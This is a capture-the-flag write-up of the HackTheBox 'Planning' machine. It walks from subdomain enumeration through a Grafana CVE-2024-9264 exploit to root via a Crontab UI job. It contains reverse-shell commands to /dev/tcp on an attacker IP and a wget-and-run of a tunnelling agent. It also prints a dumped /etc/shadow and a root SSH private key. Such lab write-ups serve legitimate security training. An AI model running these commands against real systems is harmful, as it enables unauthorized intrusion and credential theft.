---
render_with_liquid: false
title: HackTheBox Writeup - Planning
date: 2025-05-17 00:07 +1400
tags: [hackthebox, nmap, linux, assumed-breach, katana, gobuster, vhost, hakrlawler, grafana, cve-2024-9264, duckdb, sqli, file-read, command-injection, credentials-stuffing, discover-secrets, tunnel, ligolo-ng, httpx, crontab-ui, nodejs, scheduled-job-abuse]
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/c9efb253e7d1d9b407113e11afdaa905.png
    width: 640
    height: 480
---



`Planning` is an easy difficulty Linux machine that features web enumeration, subdomain fuzzing, and exploitation of a vulnerable `Grafana` instance to [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264). After gaining initial access to a Docker container, an exposed password enables lateral movement to the host system due to password reuse. Finally, a custom cron management application with `root` privileges can be leveraged to achieve full system compromise.


# Recon
---

## Hosts

> `pt` command is a **custom pentest framework** to manage hosts and variables, it is not required to reproduce the steps in this writeup
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Planning]
└─$ pt init '10.129.241.255 planning.htb grafana.planning.htb'
+----------+--------+----------------+----------------------+
| PROFILE  | STATUS |       IP       |        DOMAIN        |
+----------+--------+----------------+----------------------+
| planning | on     | 10.129.241.255 | planning.htb         |
| planning | on     | 10.129.241.255 | grafana.planning.htb |
+----------+--------+----------------+----------------------+
```

## Nmap

```bash
# Nmap 7.95 scan initiated Fri May  9 19:38:15 2025 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80, 10.129.241.255
Nmap scan report for 10.129.241.255
Host is up, received user-set (0.20s latency).
Scanned at 2025-05-09 19:38:16 CST for 13s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMv/TbRhuPIAz+BOq4x+61TDVtlp0CfnTA2y6mk03/g2CffQmx8EL/uYKHNYNdnkO7MO3DXpUbQGq1k2H6mP6Fg=
|   256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKpJkWOBF3N5HVlTJhPDWhOeW+p9G7f2E9JnYIhKs6R0
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May  9 19:38:29 2025 -- 1 IP address (1 host up) scanned in 14.30 seconds
```


## 80 - HTTP : Online Education Website


### Info

```ruby
http://planning.htb [200] [Edukate - Online Education Website] [nginx/1.24.0 (Ubuntu)] [019fcc6b7b2e64f2f2b97648dcec70288abaa058] [Bootstrap:4.4.1,Nginx:1.24.0,OWL Carousel,Ubuntu,jQuery,jQuery CDN]
```

![](/assets/obsidian/0af6f39b1edd9772b20c7c918cc1d2d9.png)

### Directory

```bash
┌──(bravosec㉿fsociety)-[~/htb/Planning]
└─$ cat httpx/urls.txt | katana -d 5 -kf all -jc -jsl -silent -fx -j -o "katana.json" -srd "katana" | jq '{endpoint: .request.endpoint, tag: .request.tag, status_code: .response.status_code, length: .response.content_length, forms: (.response.forms // [])} | select((.tag != "link")) | [.status_code, .tag, .length, .endpoint, .forms.[]]' -c
[200,null,23914,"http://planning.htb:80",{"method":"POST","action":"http://planning.htb:80/index.php","enctype":"application/x-www-form-urlencoded","parameters":["keyword"]}]
[200,"script",3338,"http://planning.htb:80/js/main.js"]
[200,"script",2406,"http://planning.htb:80/lib/counterup/counterup.min.js"]
[200,"script",2303,"http://planning.htb:80/lib/easing/easing.min.js"]
[200,"script",9028,"http://planning.htb:80/lib/waypoints/waypoints.min.js"]
[200,"script",42766,"http://planning.htb:80/lib/owlcarousel/owl.carousel.min.js"]
[200,"a",13006,"http://planning.htb:80/detail.php"]
[200,"a",10632,"http://planning.htb:80/contact.php",{"method":"GET","action":"http://planning.htb:80/contact.php"}]
[200,"a",10229,"http://planning.htb:80/course.php"]
[200,"a",12727,"http://planning.htb:80/about.php"]
[null,"js",null,"http://planning.htb:80/lib/owlcarousel/.json"]
[null,"a",null,"http://planning.htb:80/index.php"]
[null,"js",null,"http://planning.htb:80/lib/owlcarousel/owl.carousel.min.js?autoplay=1&rel=0&v="]
[200,"a",7053,"http://planning.htb:80/enroll.php",{"method":"POST","action":"http://planning.htb:80/enroll.php","enctype":"application/x-www-form-urlencoded","parameters":["full_name","email","phone"]}]
```


### Subdomains

```bash
┌──(bravosec㉿fsociety)-[~/htb/Planning]
└─$ gobuster vhost --append-domain -o gobuster_vhosts.txt -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -k -t 50 -u http://$(pt get rhost)
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://planning.htb
[+] Method:          GET
[+] Threads:         50
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: grafana.planning.htb Status: 302 [Size: 29] [--> /login]
Progress: 100000 / 100001 (100.00%)
===============================================================
Finished
===============================================================
```


## 80 - grafana.planning.htb : Grafana v11.0.0


### Info

```ruby
┌──(bravosec㉿fsociety)-[~/htb/Planning]
└─$ URL="http://$(pt get rhost):80"; OUT="$(echo $URL | awk -F'://' '{print $NF}' | sed -e 's|[/:]|-|g')"; echo $URL | httpx -random-agent -td -server -title -fr -sc -hash sha1 -silent -ss -timeout 20 -srd "httpx_$OUT" -o "httpx_$OUT/webprobe.txt"
http://grafana.planning.htb [302,200] [Grafana] [nginx/1.24.0 (Ubuntu)] [http://grafana.planning.htb:80/login] [5c0ce64eba8b90c5c6b0be42f39ed049abdfb446] [Nginx:1.24.0,Ubuntu]
```

![](/assets/obsidian/94ce71a155ccb631f2351c495d093eb0.png)

### Directory

```bash
┌──(bravosec㉿fsociety)-[~/htb/Planning]
└─$ echo http://grafana.planning.htb | hakrawler -s -insecure -d 5 -subs -u
[href] https://grafana.com/docs/grafana/latest/installation/requirements/#supported-web-browsers
[script] http://grafana.planning.htb/public/build/runtime.cdf4a91d1bca3a285368.js
[script] http://grafana.planning.htb/public/build/6029.0549a3fcb50e73c4b256.js
[script] http://grafana.planning.htb/public/build/484.805ce326eee3d290c3d9.js
[script] http://grafana.planning.htb/public/build/4998.3995ddaaae5acf1aed3e.js
[script] http://grafana.planning.htb/public/build/4570.87a4acc6d9144f9ee50a.js
[script] http://grafana.planning.htb/public/build/app.bbd213ecba15db924b4e.js
```


# User Flag
---


## Assumed breach scenario

![](/assets/obsidian/a047af56e46fc6c2387ad023431d6c2f.png)


## Shell as root on docker container


### 80 - Grafana v11.0.0 : Arbitrary file read and RCE (CVE-2024-9264)

> http://grafana.planning.htb/login

Successfully logged in with the breached credential : `admin:0D5oT70Fq13EvB5r`

![](/assets/obsidian/1e4755be632f54a54a06b19ce5b29b77.png)

- Google : `Grafana v11.0.0 exploit`

> INFO - https://grafana.com/blog/2024/10/17/grafana-security-release-critical-severity-fix-for-cve-2024-9264/

> POC - https://github.com/nollium/CVE-2024-9264

> **CVE-2024-9264 : Post-Auth DuckDB SQL Injection**
> 
> The SQL Expressions experimental feature implemented at **Grafana v11** allows for the evaluation of `duckdb` queries containing user input. These queries are insufficiently sanitized before being passed to `duckdb`, leading to a command injection and local file inclusion vulnerability. Any user with the VIEWER or higher permission is capable of executing this attack. The `duckdb` binary must be present in Grafana's $PATH for this attack to function; by default, this binary is not installed in Grafana distributions.
{: .prompt-info }

![](/assets/obsidian/fb113f2aa497b0ecacecb21d2997452b.png)

```bash
cd exploit
git clone https://github.com/nollium/CVE-2024-9264
cd CVE-2024-9264
python -m venv venv && source venv/bin/activate
pip install -r requirements.txt
```

We validated that the instance is vulnerable to **CVE-2024-9264**

```bash
┌──(venv)─(bravosec㉿fsociety)-[~/htb/Planning/exploit/CVE-2024-9264]
└─$ python CVE-2024-9264.py http://grafana.planning.htb/ -u admin -p '0D5oT70Fq13EvB5r'
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Reading file: /etc/passwd
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/etc/passwd'):
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
grafana:x:472:0::/home/grafana:/usr/sbin/nologin
```

Command execution as `root` is possible

```bash
┌──(venv)─(bravosec㉿fsociety)-[~/htb/Planning/exploit/CVE-2024-9264]
└─$ python CVE-2024-9264.py http://grafana.planning.htb/ -u admin -p '0D5oT70Fq13EvB5r' -c id
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: id
[+] Successfully ran duckdb query:
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('id >/tmp/grafana_cmd_output 2>&1 |'):
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
uid=0(root) gid=0(root) groups=0(root)
```

Get a shell

```bash
nc -lvnp 1111
```

```bash
┌──(venv)─(bravosec㉿fsociety)-[~/htb/Planning/exploit/CVE-2024-9264]
└─$ python CVE-2024-9264.py http://grafana.planning.htb/ -u admin -p '0D5oT70Fq13EvB5r' -c '/bin/bash -c "bash -i >& /dev/tcp/10.10.14.26/1111 0>&1"'
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: /bin/bash -c "bash -i >& /dev/tcp/10.10.14.26/1111 0>&1"
⠴ Running duckdb query
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Planning]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.26] from (UNKNOWN) [10.10.11.68] 49704
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@7ce659d667d7:~# /usr/bin/script -qc /bin/bash /dev/null
/usr/bin/script -qc /bin/bash /dev/null
root@7ce659d667d7:~# ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/Planning]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
root@7ce659d667d7:~# stty rows 50 columns 209
root@7ce659d667d7:~# id
uid=0(root) gid=0(root) groups=0(root)
```


## From root on docker container to enzo on host


### Credential stuffing

Since the hostname looks like a random id, we confirmed that it's a docker container

```bash
root@7ce659d667d7:~# ls -la / | grep docker
-rwxrwxrwx   1 root root    0 Apr  4 10:23 .dockerenv
```

It is common that credentials are stored in docker env, we've found `enzo`'s credential

```bash
root@7ce659d667d7:~# env
AWS_AUTH_SESSION_DURATION=15m
HOSTNAME=7ce659d667d7
PWD=/usr/share/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_HOME=/usr/share/grafana
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
HOME=/usr/share/grafana
TERM=xterm
AWS_AUTH_EXTERNAL_ID=
SHLVL=3
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_LOGS=/var/log/grafana
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
_=/usr/bin/env
```

Attempt the credential on host machine's SHH service

```bash
┌──(bravosec㉿fsociety)-[~/htb/Planning]
└─$ cssh $(pt get rhost) 'enzo' 'RioTecRANDEntANT!'
Warning: Permanently added 'grafana.planning.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)
[...]

Last login: Sat May 17 09:51:33 2025 from 10.10.14.26
enzo@planning:~$ id
uid=1000(enzo) gid=1000(enzo) groups=1000(enzo)
enzo@planning:~$ cat user.txt
afdada50dcb4bbef770b4505175b8ab7
```

# Root Flag
---

## From enzo to root


### Enumeration

The process list of other users are hidden since `/proc` was mounted with `hidepid=2`

```bash
enzo@planning:~$ ps auxfw5 | grep -vF '\_ ['
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
enzo        5850  0.0  0.2   8668  5504 pts/1    Ss   09:51   0:00 -bash
enzo        6022  0.0  0.2  10884  4352 pts/1    R+   09:57   0:00  \_ ps auxfw5
enzo        3214  0.0  0.2   8648  5376 pts/0    Ss   08:23   0:00 -bash
enzo        3413  0.0  0.2   8652  5376 pts/0    S+   08:31   0:00  \_ bash
```

```bash
enzo@planning:~$ cat /etc/fstab | grep proc
proc  /proc  proc  defaults,hidepid=2  0 0
```

There are several ports listening on localhost

```bash
enzo@planning:~$ ss -ltnpu | awk '$5 !~ /0.0.0.0|::/'
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
udp   UNCONN 0      0         127.0.0.54:53         0.0.0.0:*
udp   UNCONN 0      0      127.0.0.53%lo:53         0.0.0.0:*
tcp   LISTEN 0      70         127.0.0.1:33060      0.0.0.0:*
tcp   LISTEN 0      151        127.0.0.1:3306       0.0.0.0:*
tcp   LISTEN 0      4096       127.0.0.1:36975      0.0.0.0:*
tcp   LISTEN 0      4096       127.0.0.1:3000       0.0.0.0:*
tcp   LISTEN 0      511        127.0.0.1:8000       0.0.0.0:*
tcp   LISTEN 0      4096      127.0.0.54:53         0.0.0.0:*
tcp   LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*
tcp   LISTEN 0      4096               *:22               *:*
```

### Harvesting - Password of zip archive

There's an interesting json file that seems to be a config file for cron job in `/opt`

```bash
enzo@planning:~$ ls -latr /opt
total 16
drwx--x--x  4 root root 4096 Feb 28 19:06 containerd
drwxr-xr-x  4 root root 4096 Feb 28 19:21 .
drwxr-xr-x 22 root root 4096 Apr  3 14:40 ..
drwxr-xr-x  2 root root 4096 May 17 08:33 crontabs
enzo@planning:~$ ls -latr /opt/crontabs/
total 12
drwxr-xr-x 4 root root 4096 Feb 28 19:21 ..
drwxr-xr-x 2 root root 4096 May 17 08:33 .
-rw-r--r-- 1 root root  737 May 17 10:04 crontab.db
enzo@planning:~$ file /opt/crontabs/crontab.db
/opt/crontabs/crontab.db: New Line Delimited JSON text data
```

The file contains a password for zip archive : `P4ssw0rdS0pRi0T3c`

```bash
enzo@planning:~$ cat /opt/crontabs/crontab.db | jq .
{
  "name": "Grafana backup",
  "command": "/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz",
  "schedule": "@daily",
  "stopped": false,
  "timestamp": "Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)",
  "logging": "false",
  "mailing": {},
  "created": 1740774983276,
  "saved": false,
  "_id": "GTI22PpoJNtRKg0W"
}
{
  "name": "Cleanup",
  "command": "/root/scripts/cleanup.sh",
  "schedule": "* * * * *",
  "stopped": false,
  "timestamp": "Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)",
  "logging": "false",
  "mailing": {},
  "created": 1740849309992,
  "saved": false,
  "_id": "gNIRXh1WIc9K7BYX"
}
```


### Setup tunnel to access loopback address

> We are going to set up a tunnel to the machine to check the ports we can't access from external
{: .prompt-tip }

Start **ligolo-ng** server

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/tunnel/ligolo-ng]
└─$ cd /opt/sectools/tunnel/ligolo-ng/; sudo rm -rf ligolo-selfcerts; sudo ./proxy -nobanner -laddr 0.0.0.0:8443 -selfcert
INFO[0000] Loading configuration file ligolo-ng.yaml
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC!
ERRO[0000] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate
INFO[0000] Listening on 0.0.0.0:8443
INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8081
WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed.
ligolo-ng »
```

Download and run **ligolo-ng** agent on the machine

```bash
enzo@planning:~$ wget http://10.10.14.130:80/ligolo -O /tmp/ligolo && chmod +x /tmp/ligolo && /tmp/ligolo -connect 10.10.14.130:8443 -ignore-cert
--2025-05-18 15:52:00--  http://10.10.14.130/ligolo
Connecting to 10.10.14.130:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6500504 (6.2M) [application/octet-stream]
Saving to: ‘/tmp/ligolo’

/tmp/ligolo                                          100%[===================================================================================================================>]   6.20M  3.25MB/s    in 1.9s

2025-05-18 15:52:02 (3.25 MB/s) - ‘/tmp/ligolo’ saved [6500504/6500504]

WARN[0000] warning, certificate validation disabled
INFO[0000] Connection established                        addr="10.10.14.130:8443"
```

Setup a tunnel

```bash
ligolo-ng » session
? Specify a session : 1 - enzo@planning - 10.10.11.68:48478 - 005056b9139d
[Agent : enzo@planning] » ifcreate --name ligolo
INFO[0198] Creating a new ligolo interface...
INFO[0198] Interface created!
[Agent : enzo@planning] » tunnel_start --tun ligolo
INFO[0201] Starting tunnel to enzo@planning (005056b9139d)
```

Add a route to access loopback address

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/tunnel/ligolo-ng]
└─$ sudo ip route add 240.0.0.1/32 dev ligolo
```


### Enumerate ports on loopback address

Enumerate all ports listening on the machine

```bash
enzo@planning:~$ ss -ltnpu
Netid                State                 Recv-Q                Send-Q                               Local Address:Port                                 Peer Address:Port                Process
udp                  UNCONN                0                     0                                       127.0.0.54:53                                        0.0.0.0:*
udp                  UNCONN                0                     0                                    127.0.0.53%lo:53                                        0.0.0.0:*
tcp                  LISTEN                0                     70                                       127.0.0.1:33060                                     0.0.0.0:*
tcp                  LISTEN                0                     151                                      127.0.0.1:3306                                      0.0.0.0:*
tcp                  LISTEN                0                     4096                                     127.0.0.1:36975                                     0.0.0.0:*
tcp                  LISTEN                0                     4096                                     127.0.0.1:3000                                      0.0.0.0:*
tcp                  LISTEN                0                     511                                      127.0.0.1:8000                                      0.0.0.0:*
tcp                  LISTEN                0                     4096                                    127.0.0.54:53                                        0.0.0.0:*
tcp                  LISTEN                0                     511                                        0.0.0.0:80                                        0.0.0.0:*
tcp                  LISTEN                0                     4096                                 127.0.0.53%lo:53                                        0.0.0.0:*
tcp                  LISTEN                0                     4096                                             *:22                                              *:*
```

Extract TCP ports from the command output

```bash
┌──(bravosec㉿fsociety)-[~/htb/Planning]
└─$ cat enum/netstat.log | sed -n '/State/,$p' | tail -n +2 | awk '$1 == "tcp"' | awk '{print $5}' | cut -d':' -f2 | sed '/^[[:space:]]*$/d' | sort -u | tee netstat_tcp_ports.txt
22
3000
3306
33060
36975
53
80
8000
```

Extract TCP ports from nmap scan

```bash
┌──(bravosec㉿fsociety)-[~/htb/Planning]
└─$ cat nmap/all_tcp_ports.nmap | tail -n +2 | grep -i open | awk '{print $1}' | cut -d'/' -f1 | sort -u | tee nmap_tcp_ports.txt
22
80
```

Exclude the accessible ports from external

```bash
┌──(bravosec㉿fsociety)-[~/htb/Planning]
└─$ comm -23 netstat_tcp_ports.txt nmap_tcp_ports.txt | sort -nu | tr '\n' ',' | tee local_tcp_ports.txt
53,3000,3306,8000,33060,36975, 
```

Scan the ports

```bash
┌──(bravosec㉿fsociety)-[~/htb/Planning]
└─$ sudo nmap -PE -sVC --version-all -T4 -Pn -vv -oA ./nmap/local_tcp_scan 240.0.0.1 -p $(cat local_tcp_ports.txt)
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-17 00:07 CST
[...]
Discovered open port 3306/tcp on 240.0.0.1
Discovered open port 36975/tcp on 240.0.0.1
Discovered open port 3000/tcp on 240.0.0.1
Discovered open port 8000/tcp on 240.0.0.1
Discovered open port 33060/tcp on 240.0.0.1
[...]
```

Probe web ports during the nmap scan

```bash
┌──(bravosec㉿fsociety)-[~/htb/Planning]
└─$ for p in $(cat local_tcp_ports.txt | tr ',' '\n'); do echo "240.0.0.1:${p}"; done | httpx -random-agent -td -server -title -fr -sc -hash sha1 -silent -ss -timeout 20 -srd httpx_local
http://240.0.0.1:8000 [401] [] [da39a3ee5e6b4b0d3255bfef95601890afd80709] [Basic,Express,Node.js]
http://240.0.0.1:36975 [404] [] [9433919135ca7524150e6f77a88caed26e3b3421]
http://240.0.0.1:3000 [302,200] [Grafana] [] [http://240.0.0.1:3000/login] [f6025ddbf8fa38b72d99becf0c246d56b450ca63]
```


### 8000 - Crontab UI : Create a cron job

http://240.0.0.1:8000 requires a credential, we successfully logged in with `root:P4ssw0rdS0pRi0T3c` after trying some username and password combinations

![](/assets/obsidian/61f3d5249a59674ca1e4beac6599d267.png)

We can create corn jobs through this web app

![](/assets/obsidian/48120ae36f609ea4aaabcd5368515d55.png)

Start reverse shell listener

```bash
nc -lvnp 1111
```

Create a cron job to send reverse shell

![](/assets/obsidian/8d85264ad26c154b35904f90c54c3238.png)

Click on "Run now", got a shell immediately

![](/assets/obsidian/280eecf029f2e1c40a7e410f8b867357.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Planning]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.130] from (UNKNOWN) [10.10.11.68] 60812
bash: cannot set terminal process group (1384): Inappropriate ioctl for device
bash: no job control in this shell
root@planning:/# /usr/bin/script -qc /bin/bash /dev/null
/usr/bin/script -qc /bin/bash /dev/null
root@planning:/# ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/Planning]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
root@planning:/# stty rows 50 columns 209
root@planning:/# id
uid=0(root) gid=0(root) groups=0(root)
root@planning:/# cat /root/root.txt
b4a53a1fb77477ed6c3d0da9d87bc262
```


# Additional
---

## Post exploitation


### Secrets

```bash
root@planning:/# awk -F: '$2 ~ /^\$/' /etc/shadow
root:$y$j9T$6FXR7mi4BgmaZ7AoBiO470$CBrVTY4d7EK5JUjv8Gc2xjGVxYIr14TUCRkgFY0YvB7:20147:0:99999:7:::
enzo:$y$j9T$D.g0svThdX4dAVCvkaUz3.$jQKKPCGVxCt3NiPX9fCUSzSWXg8V2V6xKvGyhv2yiX.:20147:0:99999:7:::
```

```bash
[+] /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAPxjJDtAmBImsNcFZXr3YhzuQLPCWpRipb+SGYkuTnUQAAAJBN3qeKTd6n
igAAAAtzc2gtZWQyNTUxOQAAACAPxjJDtAmBImsNcFZXr3YhzuQLPCWpRipb+SGYkuTnUQ
AAAEDO9Hgug9Zsz/58EREKCJGKe2FV72l91Hvyp2l6jopw3A/GMkO0CYEiaw1wVlevdiHO
5As8JalGKlv5IZiS5OdRAAAADXJvb3RAcGxhbm5pbmc=
-----END OPENSSH PRIVATE KEY-----
```


### Files

```bash

```


### Client side activities


#### Keylogging & Clipboard history

```bash

```


#### Browser

```bash

```


#### Files & directories access history

```bash

```


#### Application history

```bash

```